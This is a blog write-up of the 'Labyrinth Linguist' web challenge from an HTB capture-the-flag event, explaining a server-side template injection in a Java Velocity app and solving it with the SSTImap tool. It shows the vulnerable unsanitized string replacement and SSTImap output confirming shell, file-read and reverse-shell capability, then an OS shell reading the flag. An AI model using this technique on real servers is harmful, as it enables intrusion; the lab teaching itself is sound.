---
layout: post
title:  "CA CTF - Labyrinth Linguist"
date:   2024-03-14 19:58:58 -0600
categories: ctf cyberapocalypse
tags: htb cyberapocalypse ctf web ssti
description: "Writeup/Solution to Cyber Apocalypse 2024 CTF: Labyrinth Linguist"
---

## Scenario

Files provided from HTB are in the [ctf assets](/assets/ctfs).

When we spin up the service with `./docker_build.sh` we recieve a single open http port on `localhost:1337`.
Visiting the site we see this:

![labyrinth linquist](/assets/images/ctf/ca2024/labyrinth-linguist-homepage.png)

You can play around with the text input, it is mapping characters the input characters to the symbols displayed. By default it displays the converted text of `Example text` through a [TrueType](https://en.wikipedia.org/wiki/TrueType) file.

There is a single `index.html` for the webpage and a SpringBoot java file `Main.java` in addition to the unimportant `.tff` file (responsible for holding the custom type font) and some styling.

### Finding the Injection Point

Since there were so few files, this problem was very easy to track down. There is a single function in the `Main.java` file that has the following signature with annotations:

```java
@RequestMapping("/")
@ResponseBody
String index(@RequestParam(required = false, name = "text") String textString) {
```

We can assume (correctly, because I didn't want to read javadocs) that this argument is handling the index page `/` with url parameters `text`. Validating this is simple, we can open the Firefox developer console and see requests being made to `localhost:1337?text=<the text>` whenever the `Submit` button is clicked.

I also did some tinkering and it _does_ seem to work with both `GET` and `POST` requests.

This appears to be the only injection point of any kind so we start looking here.

### Server Side Template Injection (SSTI)

Server Side Template Injection sounds fancy and complicated but its really not. Essentially, some web servers support the ability to generate `.html` (or other) files on the fly. This can be useful for choosing to render different things based on conditions or information that the is different for each user. For example, when you go to your email in the top right it will say "Welcome \<YOUR NAME HERE\>"; the name is different for every user (there are many ways to do this, SST is one of them).

A reason you would want to render a different "page" is because the information is different user to user. So how does this information get into the page? Templating. Templating is taking in a file/string with placeholders and inserting the information that is _different_ per user into those placeholders. Again, think about your email homepage; all the styling is the same for everyone, but your name is your name.

The downside to SST is that well, the server is doing the rendering of data potentially provided by the user. If done incorrectly (a.k.a unsanitized), it can have the side effects, malicious or otherwise.

In our problem, we see these lines that calls the function to render to the template (plus my added comments for context):

```java
//set default text if none is provided in url or from submit form
if (textString == null) {
	textString = "Example text";
}

//create the html file by passing that string to replace a placeholder 
template = readFileToString("/app/src/main/resources/templates/index.html", textString);

//...
//this is the code that renders the template
org.apache.velocity.Template t = new org.apache.velocity.Template();
//... noise to throw us off

//render the template
RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();
StringReader reader = new StringReader(template);
org.apache.velocity.Template t = new org.apache.velocity.Template();
t.setData(runtimeServices.parse(reader, "home"));
t.initDocument();
```

Now, I don't actually know what the _correct_ rendering template function is for SpringBoot, but I _know_ its not `readFileToString`. Sure enough, it's pretty much the only other function in the file.


```java
public static String readFileToString(String filePath, String replacement) throws IOException {
    StringBuilder content = new StringBuilder();
    BufferedReader bufferedReader = null;

    try {
        bufferedReader = new BufferedReader(new FileReader(filePath));
        String line;
        
        while ((line = bufferedReader.readLine()) != null) {
            line = line.replace("TEXT", replacement);
            content.append(line);
            content.append("\n");
        }
    } finally {
        if (bufferedReader != null) {
            try {
                bufferedReader.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    return content.toString();
}
```

To summarize, this function takes in a file, opens and reads it and **critically** replaces any `TEXT` with the provided `replacement` string.

I actually skimmed over the rest of the file after I saw the non sanitized string replacement code because I had a tool: [SSTI map](https://github.com/vladko312/SSTImap). The tool is meant to check for SSTI at a given url by passing in _normal_ templating data (such as replacing all `{{name}}` with the users name) and seeing what information is possible to get back. A common way to test this is by requesting a simple math problem like {% raw %}`{{7*7}}`{% endraw %} and seeing if {% raw %}`{{7*7}}`{% endraw %} is returned (sanitized by making it a literal string value) or if the server is actually evaluating/executing the code: `49`.

TLDR: Using the tool gives us access via the Velocity Plugin (notice that the code uses `org.apache.velocity.Template`):

```console
$ python3 sstimap.py -u http://localhost:1337?text=bar

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║  _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |
                                                |_|
[*] Version: 1.2.0
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] Loaded plugins by categories: languages: 5; legacy_engines: 2; engines: 17
[*] Loaded request body types: 4

...
[+] Velocity plugin has confirmed injection with tag '*'
[+] SSTImap identified the following injection point:

  Query parameter: text
  Engine: Velocity
  Injection: *
  Context: text
  OS: Linux
  Technique: render
  Capabilities:

    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: no
```

With this success, we rerun it with a "shell" attached:

```console
$ python3 sstimap.py -u http://localhost:1337?text=bar --os-shell
...

[+] Run commands on the operating system.

Linux $ ls /
...
flagcaa7dfddeb.txt

Linux $ cat /flagcaa7dfddeb.txt
HTB{f4k3_fl4g_f0r_t35t1ng}
```

Theres our flag!
